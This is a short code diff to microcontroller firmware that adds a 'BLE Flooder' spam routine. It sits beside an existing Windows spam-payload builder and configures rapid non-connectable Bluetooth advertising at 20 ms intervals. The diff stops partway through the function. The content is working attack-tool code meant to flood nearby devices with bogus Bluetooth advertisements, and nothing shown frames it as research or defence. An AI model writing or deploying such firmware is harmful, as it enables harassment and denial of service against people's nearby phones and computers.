@@ -218,3 +218,21 @@ size_t bleBuildWindowsSpamPayload(uint8_t* out_buf, size_t cap, const uint8_t ra
     return sizeof(windows);
 }
 
+void bleRunSpamLoop(int spam_type) {
+    if (spam_type < 0 || spam_type > 2) spam_type = 0;
+
+    ledShowAttackOff();
+    DEBUG_SER_PRINT("[*] BLE Flooder: Starting type=");
+    DEBUG_SER_PRINTLN(spam_type);
+
+    BLE.end();
+    BLE.init();
+    BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+    BLE.configAdvert()->setMinInterval(20);
+    BLE.configAdvert()->setMaxInterval(20);
+
+    uint8_t dummy[] = {0x02, 0x01, 0x06};
+    BLE.configAdvert()->setAdvData(dummy, sizeof(dummy));
+    BLE.beginPeripheral();
+    delay(100);
+
